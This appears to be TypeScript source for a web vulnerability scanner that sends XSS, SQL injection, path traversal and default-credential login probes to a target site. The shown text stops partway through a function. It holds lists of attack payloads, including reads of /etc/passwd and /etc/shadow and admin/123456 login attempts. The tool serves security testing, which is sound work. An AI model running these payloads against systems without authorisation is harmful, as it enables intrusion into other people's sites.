import axios from 'axios';
import * as cheerio from 'cheerio';
import { ScanResult, Vulnerability, ScanProgress } from '../types/scanner';

export class ScanEngine {
  private isScanning = false;
  private currentScan: ScanResult | null = null;
  private userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36';

  async performScan(
    targetUrl: string,
    onProgress?: (progress: ScanProgress) => void
  ): Promise<ScanResult> {
    this.isScanning = true;
    const scanId = `scan_${Date.now()}`;
    const startTime = Date.now();

    const scanResult: ScanResult = {
      id: scanId,
      url: targetUrl,
      timestamp: new Date(),
      duration: 0,
      vulnerabilities: [],
      totalVulnerabilities: 0,
      criticalCount: 0,
      highCount: 0,
      mediumCount: 0,
      lowCount: 0,
      infoCount: 0
    };

    this.currentScan = scanResult;
    const foundVulnerabilities: Vulnerability[] = [];

    try {
      // Step 1: Initial reconnaissance and fingerprinting
      if (onProgress) {
        onProgress({
          currentStep: 'Performing reconnaissance and fingerprinting...',
          progress: 5,
          vulnerabilitiesFound: 0
        });
      }

      const initialResponse = await this.makeRequest(targetUrl);
      const $ = cheerio.load(initialResponse.data);
      const serverInfo = this.extractServerInfo(initialResponse.headers);

      // Step 2: Technology detection
      if (onProgress) {
        onProgress({
          currentStep: 'Detecting technologies and frameworks...',
          progress: 10,
          vulnerabilitiesFound: foundVulnerabilities.length
        });
      }

      const techStack = this.detectTechnologies($, initialResponse.headers);

      // Step 3: Security headers analysis
      if (onProgress) {
        onProgress({
          currentStep: 'Analyzing security headers and configurations...',
          progress: 15,
          vulnerabilitiesFound: foundVulnerabilities.length
        });
      }

      const headerVulns = await this.checkSecurityHeaders(targetUrl, initialResponse.headers);
      foundVulnerabilities.push(...headerVulns);

      // Step 4: SSL/TLS analysis
      if (onProgress) {
        onProgress({
          currentStep: 'Analyzing SSL/TLS configuration...',
          progress: 20,
          vulnerabilitiesFound: foundVulnerabilities.length
        });
      }

      const sslVulns = await this.checkSSLConfiguration(targetUrl);
      foundVulnerabilities.push(...sslVulns);

      // Step 5: Form discovery and analysis
      if (onProgress) {
        onProgress({
          currentStep: 'Discovering and analyzing forms...',
          progress: 25,
          vulnerabilitiesFound: foundVulnerabilities.length
        });
      }

      const forms = this.discoverForms($, targetUrl);
      const links = this.discoverLinks($, targetUrl);

      // Step 6: Input validation testing
      if (onProgress) {
        onProgress({
          currentStep: 'Testing input validation mechanisms...',
          progress: 35,
          vulnerabilitiesFound: foundVulnerabilities.length
        });
      }

      const inputVulns = await this.testInputValidation(targetUrl, forms, links);
      foundVulnerabilities.push(...inputVulns);

      // Step 7: XSS Testing (Enhanced)
      if (onProgress) {
        onProgress({
          currentStep: 'Testing for Cross-Site Scripting vulnerabilities...',
          progress: 45,
          vulnerabilitiesFound: foundVulnerabilities.length
        });
      }

      const xssVulns = await this.testXSSAdvanced(targetUrl, forms, links);
      foundVulnerabilities.push(...xssVulns);

      // Step 8: SQL Injection Testing (Enhanced)
      if (onProgress) {
        onProgress({
          currentStep: 'Testing for SQL Injection vulnerabilities...',
          progress: 55,
          vulnerabilitiesFound: foundVulnerabilities.length
        });
      }

      const sqlVulns = await this.testSQLInjectionAdvanced(targetUrl, forms, links);
      foundVulnerabilities.push(...sqlVulns);

      // Step 9: Authentication and Session Management
      if (onProgress) {
        onProgress({
          currentStep: 'Analyzing authentication and session management...',
          progress: 65,
          vulnerabilitiesFound: foundVulnerabilities.length
        });
      }

      const authVulns = await this.testAuthenticationFlaws(targetUrl, forms);
      foundVulnerabilities.push(...authVulns);

      // Step 10: CSRF Testing (Enhanced)
      if (onProgress) {
        onProgress({
          currentStep: 'Testing CSRF protection mechanisms...',
          progress: 70,
          vulnerabilitiesFound: foundVulnerabilities.length
        });
      }

      const csrfVulns = await this.testCSRFAdvanced(forms, initialResponse.headers);
      foundVulnerabilities.push(...csrfVulns);

      // Step 11: Directory Traversal and File Inclusion
      if (onProgress) {
        onProgress({
          currentStep: 'Testing for directory traversal and file inclusion...',
          progress: 80,
          vulnerabilitiesFound: foundVulnerabilities.length
        });
      }

      const dirVulns = await this.testDirectoryTraversalAdvanced(targetUrl, links);
      foundVulnerabilities.push(...dirVulns);

      // Step 12: Command Injection Testing
      if (onProgress) {
        onProgress({
          currentStep: 'Testing for command injection vulnerabilities...',
          progress: 85,
          vulnerabilitiesFound: foundVulnerabilities.length
        });
      }

      const cmdVulns = await this.testCommandInjection(targetUrl, forms, links);
      foundVulnerabilities.push(...cmdVulns);

      // Step 13: Open Redirect and URL Manipulation
      if (onProgress) {
        onProgress({
          currentStep: 'Testing for open redirects and URL manipulation...',
          progress: 90,
          vulnerabilitiesFound: foundVulnerabilities.length
        });
      }

      const redirectVulns = await this.testOpenRedirectAdvanced(targetUrl, links);
      foundVulnerabilities.push(...redirectVulns);

      // Step 14: Information Disclosure
      if (onProgress) {
        onProgress({
          currentStep: 'Checking for information disclosure...',
          progress: 95,
          vulnerabilitiesFound: foundVulnerabilities.length
        });
      }

      const infoVulns = await this.testInformationDisclosure(targetUrl);
      foundVulnerabilities.push(...infoVulns);

      // Step 15: Final analysis and report generation
      if (onProgress) {
        onProgress({
          currentStep: 'Generating comprehensive security report...',
          progress: 100,
          vulnerabilitiesFound: foundVulnerabilities.length
        });
      }

      const endTime = Date.now();
      const duration = Math.round((endTime - startTime) / 1000);

      // Count vulnerabilities by severity
      const severityCounts = foundVulnerabilities.reduce((acc, vuln) => {
        switch (vuln.severity) {
          case 'Critical': acc.criticalCount++; break;
          case 'High': acc.highCount++; break;
          case 'Medium': acc.mediumCount++; break;
          case 'Low': acc.lowCount++; break;
          case 'Info': acc.infoCount++; break;
        }
        return acc;
      }, { criticalCount: 0, highCount: 0, mediumCount: 0, lowCount: 0, infoCount: 0 });

      const completedScan: ScanResult = {
        ...scanResult,
        duration,
        vulnerabilities: foundVulnerabilities,
        totalVulnerabilities: foundVulnerabilities.length,
        ...severityCounts
      };

      this.currentScan = completedScan;
      return completedScan;

    } catch (error) {
      console.error('Scan error:', error);
      throw error;
    } finally {
      this.isScanning = false;
    }
  }

  private async makeRequest(url: string, options: any = {}): Promise<any> {
    try {
      const response = await axios({
        url,
        timeout: 15000,
        validateStatus: () => true,
        headers: {
          'User-Agent': this.userAgent,
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
          'Accept-Language': 'en-US,en;q=0.5',
          'Accept-Encoding': 'gzip, deflate',
          'Connection': 'keep-alive',
          ...options.headers
        },
        ...options
      });
      return response;
    } catch (error) {
      if (axios.isAxiosError(error)) {
        throw new Error(`Request failed: ${error.message}`);
      }
      throw error;
    }
  }

  private extractServerInfo(headers: any): any {
    return {
      server: headers.server || 'Unknown',
      poweredBy: headers['x-powered-by'] || null,
      aspNetVersion: headers['x-aspnet-version'] || null,
      phpVersion: this.extractPHPVersion(headers),
      framework: this.detectFramework(headers)
    };
  }

  private extractPHPVersion(headers: any): string | null {
    const server = headers.server || '';
    const phpMatch = server.match(/PHP\/(\d+\.\d+\.\d+)/i);
    return phpMatch ? phpMatch[1] : null;
  }

  private detectFramework(headers: any): string | null {
    if (headers['x-powered-by']) {
      const poweredBy = headers['x-powered-by'].toLowerCase();
      if (poweredBy.includes('express')) return 'Express.js';
      if (poweredBy.includes('django')) return 'Django';
      if (poweredBy.includes('rails')) return 'Ruby on Rails';
      if (poweredBy.includes('laravel')) return 'Laravel';
    }
    return null;
  }

  private detectTechnologies($: cheerio.CheerioAPI, headers: any): string[] {
    const technologies: string[] = [];
    
    // Check for common JavaScript frameworks
    if ($('script[src*="react"]').length > 0) technologies.push('React');
    if ($('script[src*="angular"]').length > 0) technologies.push('Angular');
    if ($('script[src*="vue"]').length > 0) technologies.push('Vue.js');
    if ($('script[src*="jquery"]').length > 0) technologies.push('jQuery');
    
    // Check for CSS frameworks
    if ($('link[href*="bootstrap"]').length > 0) technologies.push('Bootstrap');
    if ($('link[href*="tailwind"]').length > 0) technologies.push('Tailwind CSS');
    
    // Check for CMS indicators
    if ($('meta[name="generator"]').attr('content')?.includes('WordPress')) technologies.push('WordPress');
    if ($('script[src*="wp-content"]').length > 0) technologies.push('WordPress');
    
    return technologies;
  }

  private async checkSecurityHeaders(url: string, headers: any): Promise<Vulnerability[]> {
    const vulnerabilities: Vulnerability[] = [];
    const securityHeaders = {
      'strict-transport-security': {
        name: 'HTTP Strict Transport Security (HSTS)',
        severity: 'Medium' as const,
        description: 'HSTS header is missing, allowing potential downgrade attacks.'
      },
      'content-security-policy': {
        name: 'Content Security Policy (CSP)',
        severity: 'High' as const,
        description: 'CSP header is missing, increasing XSS attack surface.'
      },
      'x-frame-options': {
        name: 'X-Frame-Options',
        severity: 'Medium' as const,
        description: 'X-Frame-Options header is missing, allowing clickjacking attacks.'
      },
      'x-content-type-options': {
        name: 'X-Content-Type-Options',
        severity: 'Low' as const,
        description: 'X-Content-Type-Options header is missing, allowing MIME type sniffing.'
      },
      'referrer-policy': {
        name: 'Referrer Policy',
        severity: 'Low' as const,
        description: 'Referrer-Policy header is missing, potentially leaking sensitive URLs.'
      },
      'permissions-policy': {
        name: 'Permissions Policy',
        severity: 'Low' as const,
        description: 'Permissions-Policy header is missing, not controlling browser features.'
      }
    };

    const missingHeaders: string[] = [];
    const weakHeaders: string[] = [];

    Object.entries(securityHeaders).forEach(([header, config]) => {
      const headerValue = headers[header] || headers[header.toLowerCase()];
      
      if (!headerValue) {
        missingHeaders.push(header);
        vulnerabilities.push({
          id: `header_${header}_${Date.now()}`,
          type: 'Security Misconfiguration',
          severity: config.severity,
          title: `Missing ${config.name}`,
          description: config.description,
          evidence: `Header "${header}" is not present in the response`,
          recommendation: `Implement the ${config.name} header with appropriate values.`,
          cwe: 'CWE-16',
          owasp: 'A05'
        });
      } else {
        // Check for weak configurations
        if (header === 'x-frame-options' && headerValue.toLowerCase() === 'allowall') {
          weakHeaders.push(header);
        }
        if (header === 'content-security-policy' && headerValue.includes('unsafe-inline')) {
          vulnerabilities.push({
            id: `weak_csp_${Date.now()}`,
            type: 'Security Misconfiguration',
            severity: 'Medium',
            title: 'Weak Content Security Policy',
            description: 'CSP contains unsafe-inline directive, reducing protection against XSS.',
            evidence: `CSP header contains: ${headerValue}`,
            recommendation: 'Remove unsafe-inline and use nonces or hashes for inline scripts.',
            cwe: 'CWE-16',
            owasp: 'A05'
          });
        }
      }
    });

    return vulnerabilities;
  }

  private async checkSSLConfiguration(url: string): Promise<Vulnerability[]> {
    const vulnerabilities: Vulnerability[] = [];
    
    try {
      const urlObj = new URL(url);
      
      if (urlObj.protocol === 'http:') {
        vulnerabilities.push({
          id: `ssl_missing_${Date.now()}`,
          type: 'Sensitive Data Exposure',
          severity: 'High',
          title: 'Missing SSL/TLS Encryption',
          description: 'The application is served over HTTP instead of HTTPS.',
          evidence: `URL uses HTTP protocol: ${url}`,
          recommendation: 'Implement SSL/TLS encryption and redirect all HTTP traffic to HTTPS.',
          cwe: 'CWE-319',
          owasp: 'A02'
        });
      }

      // Test for mixed content (if HTTPS)
      if (urlObj.protocol === 'https:') {
        const response = await this.makeRequest(url);
        const $ = cheerio.load(response.data);
        
        const httpResources: string[] = [];
        $('script[src^="http:"], link[href^="http:"], img[src^="http:"]').each((_, element) => {
          const src = $(element).attr('src') || $(element).attr('href');
          if (src) httpResources.push(src);
        });

        if (httpResources.length > 0) {
          vulnerabilities.push({
            id: `mixed_content_${Date.now()}`,
            type: 'Sensitive Data Exposure',
            severity: 'Medium',
            title: 'Mixed Content Detected',
            description: 'HTTPS page loads resources over HTTP, creating security risks.',
            evidence: `HTTP resources found: ${httpResources.slice(0, 3).join(', ')}${httpResources.length > 3 ? '...' : ''}`,
            recommendation: 'Ensure all resources are loaded over HTTPS.',
            cwe: 'CWE-319',
            owasp: 'A02'
          });
        }
      }
    } catch (error) {
      // Continue with other tests
    }

    return vulnerabilities;
  }

  private discoverForms($: cheerio.CheerioAPI, baseUrl: string): Array<{url: string, method: string, inputs: Array<{name: string, type: string}>, hasCSRF: boolean}> {
    const forms: Array<{url: string, method: string, inputs: Array<{name: string, type: string}>, hasCSRF: boolean}> = [];

    $('form').each((_, form) => {
      const $form = $(form);
      const action = $form.attr('action') || '';
      const method = ($form.attr('method') || 'GET').toUpperCase();
      
      let formUrl = this.resolveURL(action, baseUrl);

      const inputs: Array<{name: string, type: string}> = [];
      let hasCSRF = false;

      $form.find('input, textarea, select').each((_, input) => {
        const $input = $(input);
        const name = $input.attr('name');
        const type = $input.attr('type') || 'text';
        
        if (name) {
          inputs.push({ name, type });
          
          // Check for CSRF tokens
          if (name.toLowerCase().includes('csrf') || 
              name.toLowerCase().includes('token') || 
              name.toLowerCase().includes('_token') ||
              type === 'hidden') {
            hasCSRF = true;
          }
        }
      });

      if (inputs.length > 0) {
        forms.push({ url: formUrl, method, inputs, hasCSRF });
      }
    });

    return forms;
  }

  private discoverLinks($: cheerio.CheerioAPI, baseUrl: string): string[] {
    const links: string[] = [];
    
    $('a[href]').each((_, link) => {
      const href = $(link).attr('href');
      if (href && !href.startsWith('#') && !href.startsWith('mailto:') && !href.startsWith('tel:')) {
        const fullUrl = this.resolveURL(href, baseUrl);
        if (fullUrl.startsWith('http')) {
          links.push(fullUrl);
        }
      }
    });

    return [...new Set(links)].slice(0, 20); // Limit to 20 unique links
  }

  private resolveURL(url: string, baseUrl: string): string {
    try {
      if (url.startsWith('http')) return url;
      if (url.startsWith('//')) return new URL(baseUrl).protocol + url;
      if (url.startsWith('/')) {
        const urlObj = new URL(baseUrl);
        return `${urlObj.protocol}//${urlObj.host}${url}`;
      }
      return new URL(url, baseUrl).toString();
    } catch {
      return baseUrl;
    }
  }

  private async testInputValidation(targetUrl: string, forms: any[], links: string[]): Promise<Vulnerability[]> {
    const vulnerabilities: Vulnerability[] = [];
    const invalidInputs = [
      { payload: 'A'.repeat(10000), type: 'Buffer Overflow Test' },
      { payload: '"><script>alert(1)</script>', type: 'HTML Injection Test' },
      { payload: '../../../etc/passwd', type: 'Path Traversal Test' },
      { payload: '${7*7}', type: 'Template Injection Test' }
    ];

    // Test URL parameters
    try {
      const urlObj = new URL(targetUrl);
      const originalParams = Array.from(urlObj.searchParams.keys());
      
      if (originalParams.length > 0) {
        for (const testCase of invalidInputs.slice(0, 2)) {
          if (!this.isScanning) break;
          
          const testParam = originalParams[0];
          urlObj.searchParams.set(testParam, testCase.payload);
          
          const response = await this.makeRequest(urlObj.toString());
          
          if (response.status === 500 || response.data.includes('error') || response.data.includes('exception')) {
            vulnerabilities.push({
              id: `input_validation_${Date.now()}_${Math.random()}`,
              type: 'Security Misconfiguration',
              severity: 'Medium',
              title: 'Insufficient Input Validation',
              description: 'Application does not properly validate user input, causing errors.',
              evidence: `${testCase.type} caused server error with payload: ${testCase.payload.substring(0, 100)}`,
              recommendation: 'Implement comprehensive input validation and proper error handling.',
              cwe: 'CWE-20',
              owasp: 'A03'
            });
            break;
          }
        }
      }
    } catch (error) {
      // Continue with other tests
    }

    return vulnerabilities;
  }

  private async testXSSAdvanced(targetUrl: string, forms: any[], links: string[]): Promise<Vulnerability[]> {
    const vulnerabilities: Vulnerability[] = [];
    const xssPayloads = [
      // Basic XSS
      '<script>alert("XSS")</script>',
      '"><script>alert("XSS")</script>',
      "';alert('XSS');//",
      
      // Event-based XSS
      '<img src=x onerror=alert("XSS")>',
      '<svg onload=alert("XSS")>',
      '<body onload=alert("XSS")>',
      
      // Encoded XSS
      '%3Cscript%3Ealert(%22XSS%22)%3C/script%3E',
      '&lt;script&gt;alert("XSS")&lt;/script&gt;',
      
      // Filter bypass attempts
      '<ScRiPt>alert("XSS")</ScRiPt>',
      'javascript:alert("XSS")',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      
      // DOM-based XSS indicators
      'document.write("XSS")',
      'eval("alert(\'XSS\')")'
    ];

    // Test URL parameters with advanced payloads
    try {
      const urlObj = new URL(targetUrl);
      const testParams = ['q', 'search', 'query', 'input', 'data', 'value'];
      
      for (const param of testParams.slice(0, 3)) {
        if (!this.isScanning) break;
        
        for (const payload of xssPayloads.slice(0, 4)) {
          urlObj.searchParams.set(param, payload);
          
          try {
            const response = await this.makeRequest(urlObj.toString());
            
            if (response.data && this.detectXSSReflection(response.data, payload)) {
              vulnerabilities.push({
                id: `xss_reflected_${Date.now()}_${Math.random()}`,
                type: 'XSS',
                severity: 'High',
                title: 'Reflected Cross-Site Scripting (XSS)',
                description: 'User input is reflected in the response without proper sanitization.',
                evidence: `Payload "${payload}" was reflected in response at parameter "${param}"`,
                recommendation: 'Implement proper input validation, output encoding, and Content Security Policy (CSP).',
                cwe: 'CWE-79',
                owasp: 'A03'
              });
              break;
            }
          } catch (error) {
            // Continue with next payload
          }
        }
      }
    } catch (error) {
      // Continue with other tests
    }

    // Test forms with XSS payloads
    for (const form of forms.slice(0, 3)) {
      if (!this.isScanning) break;
      
      try {
        for (const payload of xssPayloads.slice(0, 3)) {
          const formData = new FormData();
          
          form.inputs.forEach((input: any) => {
            if (input.type === 'email') {
              formData.append(input.name, 'test@example.com');
            } else if (input.type === 'password') {
              formData.append(input.name, 'password123');
            } else if (input.type === 'hidden' || input.name.toLowerCase().includes('csrf')) {
              formData.append(input.name, 'test');
            } else {
              formData.append(input.name, payload);
            }
          });

          const response = await this.makeRequest(form.url, {
            method: form.method,
            data: formData,
            headers: { 'Content-Type': 'multipart/form-data' }
          });

          if (response.data && this.detectXSSReflection(response.data, payload)) {
            vulnerabilities.push({
              id: `xss_form_${Date.now()}_${Math.random()}`,
              type: 'XSS',
              severity: 'High',
              title: 'Form-based Cross-Site Scripting (XSS)',
              description: 'Form input is reflected without proper sanitization.',
              evidence: `Payload "${payload}" was reflected in form response at ${form.url}`,
              recommendation: 'Sanitize all user inputs before displaying them. Use output encoding and CSP.',
              cwe: 'CWE-79',
              owasp: 'A03'
            });
            break;
          }
        }
      } catch (error) {
        // Continue with next form
      }
    }

    return vulnerabilities;
  }

  private detectXSSReflection(responseData: string, payload: string): boolean {
    // Check for direct reflection
    if (responseData.includes(payload)) return true;
    
    // Check for HTML entity encoded reflection
    const htmlEncoded = payload
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#x27;');
    
    if (responseData.includes(htmlEncoded)) return true;
    
    // Check for URL encoded reflection
    const urlEncoded = encodeURIComponent(payload);
    if (responseData.includes(urlEncoded)) return true;
    
    return false;
  }

  private async testSQLInjectionAdvanced(targetUrl: string, forms: any[], links: string[]): Promise<Vulnerability[]> {
    const vulnerabilities: Vulnerability[] = [];
    
    const sqlPayloads = [
      // Basic SQL injection
      "' OR '1'='1",
      "1' OR '1'='1' --",
      "admin'--",
      
      // Union-based injection
      "1' UNION SELECT NULL,NULL,NULL--",
      "' UNION SELECT 1,2,3,4,5--",
      
      // Boolean-based blind injection
      "1' AND (SELECT COUNT(*) FROM users) > 0 --",
      "1' AND 1=1--",
      "1' AND 1=2--",
      
      // Time-based blind injection
      "1'; WAITFOR DELAY '00:00:05'--",
      "1' OR SLEEP(5)--",
      
      // Error-based injection
      "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
      "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
    ];

    const sqlErrorPatterns = [
      /mysql_fetch_array/i,
      /ORA-\d+/i,
      /Microsoft.*ODBC.*SQL Server/i,
      /PostgreSQL.*ERROR/i,
      /Warning.*mysql_/i,
      /valid MySQL result/i,
      /MySqlClient\./i,
      /syntax error/i,
      /unclosed quotation mark/i,
      /quoted string not properly terminated/i,
      /SQL syntax.*MySQL/i,
      /Warning.*\Wmysql_/i,
      /function\.mysql/i,
      /MySQL result index/i,
      /Warning.*\Wpg_/i,
      /valid PostgreSQL result/i,
      /Warning.*\Woci_/i,
      /Microsoft OLE DB Provider for ODBC Drivers/i,
      /Microsoft OLE DB Provider for SQL Server/i,
      /Incorrect syntax near/i,
      /OLE DB provider returned message/i,
      /Server Error in .* Application/i,
      /Operation must use an updateable query/i,
      /Microsoft JET Database Engine/i,
      /ADODB\.Field \(0x800A0BCD\)/i
    ];

    // Test URL parameters
    try {
      const urlObj = new URL(targetUrl);
      const testParams = ['id', 'user', 'page', 'category', 'product', 'search'];
      
      for (const param of testParams.slice(0, 3)) {
        if (!this.isScanning) break;
        
        for (const payload of sqlPayloads.slice(0, 5)) {
          urlObj.searchParams.set(param, payload);
          
          try {
            const startTime = Date.now();
            const response = await this.makeRequest(urlObj.toString());
            const responseTime = Date.now() - startTime;
            
            // Check for SQL errors
            if (response.data && this.detectSQLError(response.data, sqlErrorPatterns)) {
              vulnerabilities.push({
                id: `sql_error_${Date.now()}_${Math.random()}`,
                type: 'SQLi',
                severity: 'Critical',
                title: 'SQL Injection Vulnerability (Error-based)',
                description: 'Database queries are constructed with unsanitized user input, revealing SQL errors.',
                evidence: `SQL error detected when injecting payload "${payload}" in parameter "${param}"`,
                recommendation: 'Use parameterized queries or prepared statements. Implement proper input validation.',
                cwe: 'CWE-89',
                owasp: 'A03'
              });
              break;
            }
            
            // Check for time-based blind SQL injection
            if (payload.includes('SLEEP') || payload.includes('WAITFOR')) {
              if (responseTime > 4000) { // 4+ seconds delay
                vulnerabilities.push({
                  id: `sql_time_${Date.now()}_${Math.random()}`,
                  type: 'SQLi',
                  severity: 'Critical',
                  title: 'Time-based Blind SQL Injection',
                  description: 'Application is vulnerable to time-based blind SQL injection.',
                  evidence: `Response delayed by ${responseTime}ms when using time-based payload "${payload}"`,
                  recommendation: 'Use parameterized queries and implement proper input validation.',
                  cwe: 'CWE-89',
                  owasp: 'A03'
                });
                break;
              }
            }
          } catch (error) {
            // Continue with next payload
          }
        }
      }
    } catch (error) {
      // Continue with other tests
    }

    // Test forms
    for (const form of forms.slice(0, 2)) {
      if (!this.isScanning) break;
      
      try {
        for (const payload of sqlPayloads.slice(0, 3)) {
          const formData = new FormData();
          
          form.inputs.forEach((input: any) => {
            if (input.type === 'email') {
              formData.append(input.name, 'test@example.com');
            } else if (input.type === 'password') {
              formData.append(input.name, 'password123');
            } else if (input.type === 'hidden' || input.name.toLowerCase().includes('csrf')) {
              formData.append(input.name, 'test');
            } else {
              formData.append(input.name, payload);
            }
          });

          const response = await this.makeRequest(form.url, {
            method: form.method,
            data: formData
          });

          if (response.data && this.detectSQLError(response.data, sqlErrorPatterns)) {
            vulnerabilities.push({
              id: `sql_form_${Date.now()}_${Math.random()}`,
              type: 'SQLi',
              severity: 'Critical',
              title: 'Form-based SQL Injection',
              description: 'Form processing is vulnerable to SQL injection attacks.',
              evidence: `SQL error detected in form at ${form.url} with payload "${payload}"`,
              recommendation: 'Use parameterized queries for all database operations.',
              cwe: 'CWE-89',
              owasp: 'A03'
            });
            break;
          }
        }
      } catch (error) {
        // Continue with next form
      }
    }

    return vulnerabilities;
  }

  private detectSQLError(responseData: string, patterns: RegExp[]): boolean {
    return patterns.some(pattern => pattern.test(responseData));
  }

  private async testAuthenticationFlaws(targetUrl: string, forms: any[]): Promise<Vulnerability[]> {
    const vulnerabilities: Vulnerability[] = [];

    // Check for login forms
    const loginForms = forms.filter(form => 
      form.inputs.some((input: any) => 
        input.type === 'password' || 
        input.name.toLowerCase().includes('password') ||
        input.name.toLowerCase().includes('login')
      )
    );

    for (const form of loginForms.slice(0, 2)) {
      if (!this.isScanning) break;
      
      try {
        // Test for weak password policies
        const weakPasswords = ['123456', 'password', 'admin', ''];
        
        for (const weakPass of weakPasswords.slice(0, 2)) {
          const formData = new FormData();
          
          form.inputs.forEach((input: any) => {
            if (input.type === 'password') {
              formData.append(input.name, weakPass);
            } else if (input.name.toLowerCase().includes('user') || input.name.toLowerCase().includes('email')) {
              formData.append(input.name, 'admin');
            } else if (input.type !== 'hidden') {
              formData.append(input.name, 'test');
            }
          });

          const response = await this.makeRequest(form.url, {
            method: form.method,
            data: formData
          });

          // Check for successful login indicators
          if (response.data && (
            response.data.includes('dashboard') ||
            response.data.includes('welcome') ||
            response.data.includes('logout') ||
            response.status === 302
          )) {
            vulnerabilities.push({
              id: `weak_auth_${Date.now()}_${Math.random()}`,
              type: 'Broken Authentication',
              severity: 'Critical',
              title: 'Weak Authentication Credentials',
              description: 'Application accepts weak or default credentials.',
              evidence: `Successful login with weak credentials: admin/${weakPass || '(empty)'}`,
              recommendation: 'Implement strong password policies and disable default accounts.',
              cwe: 'CWE-521',
              owasp: 'A07'
            });
            break;
          }
        }

        // Test for username enumeration
        const testUsernames = ['admin', 'administrator', 'user', 'test'];
        const responses: number[] = [];
        
        for (const username of testUsernames.slice(0, 2)) {
          const formData = new FormData();
          
          form.inputs.forEach((input: any) => {
            if (input.type === 'password') {
              formData.append(input.name, 'wrongpassword');
            } else if (input.name.toLowerCase().includes('user') || input.name.toLowerCase().includes('email')) {
              formData.append(input.name, username);
            } else if (input.type !== 'hidden') {
              formData.append(input.name, 'test');
            }
          });

          const startTime = Date.now();
          const response = await this.makeRequest(form.url, {
            method: form.method,
            data: formData
          });
          const responseTime = Date.now() - startTime;
          
          responses.push(responseTime);
        }

        // Check for timing differences (username enumeration)
        if (responses.length >= 2) {
          const timeDiff = Math.abs(responses[0] - responses[1]);
          if (timeDiff > 500) { // 500ms difference
            vulnerabilities.push({
              id: `user_enum_${Date.now()}_${Math.random()}`,
              type: 'Broken Authentication',
              severity: 'Medium',
              title: 'Username Enumeration',
              description: 'Application reveals whether usernames exist through timing differences.',
              evidence: `Timing difference of ${timeDiff}ms detected between valid and invalid usernames`,
              recommendation: 'Ensure consistent response times for both valid and invalid usernames.',
              cwe: 'CWE-204',
              owasp: 'A07'
            });
          }
        }

      } catch (error) {
        // Continue with next form
      }
    }

    return vulnerabilities;
  }

  private async testCSRFAdvanced(forms: any[], headers: any): Promise<Vulnerability[]> {
    const vulnerabilities: Vulnerability[] = [];

    // Check SameSite cookie attribute
    const cookies = headers['set-cookie'] || [];
    let hasSameSiteCookies = false;
    
    if (Array.isArray(cookies)) {
      hasSameSiteCookies = cookies.some(cookie => 
        cookie.toLowerCase().includes('samesite=strict') || 
        cookie.toLowerCase().includes('samesite=lax')
      );
    }

    for (const form of forms) {
      if (!this.isScanning) break;
      
      if (form.method === 'POST') {
        const hasCSRFToken = form.hasCSRF;
        const isStateChanging = form.inputs.some((input: any) => 
          input.name.toLowerCase().includes('delete') ||
          input.name.toLowerCase().includes('update') ||
          input.name.toLowerCase().includes('create') ||
          input.type === 'submit'
        );

        if (!hasCSRFToken && isStateChanging) {
          let severity: 'Critical' | 'High' | 'Medium' = 'Medium';
          
          // Increase severity if no SameSite cookies
          if (!hasSameSiteCookies) {
            severity = 'High';
          }
          
          // Critical if it's an admin or sensitive form
          if (form.url.includes('admin') || form.url.includes('delete') || form.url.includes('transfer')) {
            severity = 'Critical';
          }

          vulnerabilities.push({
            id: `csrf_${Date.now()}_${Math.random()}`,
            type: 'CSRF',
            severity,
            title: 'Cross-Site Request Forgery (CSRF)',
            description: 'Form lacks proper CSRF protection, allowing unauthorized actions.',
            evidence: `No CSRF token found in POST form at ${form.url}. SameSite cookies: ${hasSameSiteCookies ? 'Present' : 'Missing'}`,
            recommendation: 'Implement CSRF tokens for all state-changing operations and use SameSite cookie attributes.',
            cwe: 'CWE-352',
            owasp: 'A01'
          });
        }
      }
    }

    return vulnerabilities;
  }

  private async testDirectoryTraversalAdvanced(targetUrl: string, links: string[]): Promise<Vulnerability[]> {
    const vulnerabilities: Vulnerability[] = [];
    
    const traversalPayloads = [
      // Basic traversal
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
      
      // Encoded traversal
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cdrivers%5cetc%5chosts',
      
      // Double encoding
      '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
      
      // Unicode encoding
      '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
      
      // Null byte injection
      '../../../etc/passwd%00',
      '../../../etc/passwd%00.jpg',
      
      // Filter bypass
      '....//....//....//etc/passwd',
      '..//////..//////..//////etc/passwd'
    ];

    const systemFiles = [
      '/etc/passwd',
      '/etc/shadow',
      '/etc/hosts',
      '/proc/version',
      '/windows/system32/drivers/etc/hosts',
      '/windows/win.ini',
      '/boot.ini'
    ];

    try {
      const urlObj = new URL(targetUrl);
      const fileParams = ['file', 'path', 'page', 'include', 'doc', 'document', 'root', 'pg', 'style', 'pdf', 'template'];
      
      for (const param of fileParams.slice(0, 4)) {
        if (!this.isScanning) break;
        
        for (const payload of traversalPayloads.slice(0, 4)) {
          urlObj.searchParams.set(param, payload);
          
          try {
            const response = await this.makeRequest(urlObj.toString());
            
            if (response.data && this.detectSystemFileAccess(response.data)) {
              vulnerabilities.push({
                id: `dir_traversal_${Date.now()}_${Math.random()}`,
                type: 'Directory Traversal',
                severity: 'High',
                title: 'Directory Traversal Vulnerability',
                description: 'File path parameters are not properly validated, allowing access to system files.',
                evidence: `Successfully accessed system files using payload "${payload}" in parameter "${param}"`,
                recommendation: 'Validate and sanitize file paths. Use whitelisting for allowed files and implement proper access controls.',
                cwe: 'CWE-22',
                owasp: 'A01'
              });
              return vulnerabilities; // Found one, that's enough for demo
            }
          } catch (error) {
            // Continue testing
          }
        }
      }

      // Test direct file access
      for (const file of systemFiles.slice(0, 3)) {
        if (!this.isScanning) break;
        
        try {
          const fileUrl = `${targetUrl.replace(/\/$/, '')}${file}`;
          const response = await this.makeRequest(fileUrl);
          
